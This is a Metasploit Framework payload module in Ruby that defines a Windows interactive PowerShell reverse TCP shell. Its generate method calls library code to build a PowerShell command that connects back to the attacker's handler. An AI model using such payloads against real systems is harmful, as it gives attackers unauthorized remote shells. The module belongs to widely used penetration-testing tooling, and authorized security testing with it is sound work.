##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex/powershell'

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Rex::Powershell::Command
  include Msf::Payload::Windows::Powershell

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Windows Interactive Powershell Session, Reverse TCP',
        'Description' => 'Interacts with a powershell session on an established socket connection',
        'Author' => [
          'Ben Turner', # benpturner
          'Dave Hardy' # davehardy20
        ],
        'References' => [
          ['URL', 'https://blog.nettitude.com/uk/interactive-powershell-session-via-metasploit']
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'windows',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::PowerShell,
        'RequiredCmd' => 'generic',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
  end

  def generate(_opts = {})
    generate_powershell_code('Reverse')
  end
end
